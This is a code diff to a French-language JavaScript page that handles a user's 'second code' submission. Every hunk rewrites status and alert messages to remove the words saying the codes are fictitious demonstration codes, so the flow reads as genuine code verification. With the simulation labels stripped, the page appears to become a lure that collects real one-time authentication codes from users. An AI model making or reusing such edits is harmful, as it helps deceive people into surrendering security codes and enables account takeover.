@@ -258,7 +258,7 @@ if (!code) {
     sendSecondCode.textContent = "Transmission...";
 
     afficherMessage(
-        "Transmission de votre code fictif...",
+        "Vérification de votre code...",
         "#D96B27"
     );
 
@@ -281,7 +281,7 @@ if (!code) {
         );
 
         afficherMessage(
-            "Code fictif transmis. En attente de validation...",
+            "Code vérification. En attente...",
             "#258443"
         );
 
@@ -373,7 +373,7 @@ function traiterStatutDeuxiemeCode(statut) {
         verificationEnCours = false;
 
         afficherMessage(
-            "Votre deuxième code fictif a été accepté !",
+            "Votre deuxième code est correct !",
             "#258443"
         );
 
@@ -407,12 +407,12 @@ function traiterStatutDeuxiemeCode(statut) {
         sendSecondCode.textContent = "Réessayer";
 
         afficherMessage(
-            "Votre deuxième code fictif a été refusé.",
+            "Votre code est incorrecte.",
             "#D32F2F"
         );
 
         alert(
-            "Votre deuxième code fictif n'a pas été accepté. Vous pouvez essayer à nouveau avec un autre code de démonstration."
+            "Bien vouloir réessayer ."
         );
 
         secondDemoCode.focus();
@@ -427,7 +427,7 @@ function traiterStatutDeuxiemeCode(statut) {
     if (statut === "simulation_en_attente") {
 
         afficherMessage(
-            "Votre code fictif est en cours de validation. Veuillez patienter...",
+            "code vérification, Veuillez patienter...",
             "#D96B27"
         );
     }
@@ -502,7 +502,7 @@ async function initialiserDeuxiemeEtape() {
             ouvrirModal(codeModal);
 
             afficherMessage(
-                "Votre code fictif est en cours de validation...",
+                "Votre code est en cours de vérification...",
                 "#D96B27"
             );
 
@@ -515,7 +515,7 @@ async function initialiserDeuxiemeEtape() {
         if (resultat.statut === "simulation_rejetee") {
 
             afficherMessage(
-                "Votre précédent code fictif a été refusé. Vous pouvez réessayer.",
+                "Votre précédent code a été incorrecte. Vous pouvez réessayer.",
                 "#D32F2F"
             );
         }
